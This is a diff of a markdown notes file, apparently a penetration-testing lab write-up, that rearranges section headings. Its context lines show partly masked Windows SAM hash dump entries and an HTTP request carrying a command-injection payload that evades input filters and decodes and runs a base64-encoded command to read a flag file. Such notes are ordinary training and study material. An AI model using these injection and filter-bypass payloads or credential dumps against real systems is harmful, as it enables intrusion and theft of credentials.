@@ -419,7 +419,10 @@ mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxx:::
 WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxx:::
 wksadmin:1003:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a9xxxxxxxxxx:::
 ```
-#### Skills Assessment Command Injections:
+---
+### Command Injection:
+---
+#### Skills Assessment:
 
 ```
 GET /index.php?to=tmp%26%26bash<<<$(base64%09-d<<<"Y2F0IC9mbGFnLnR4dA==")&from=2380029473.txt&finish=1&move=1 HTTP/1.1
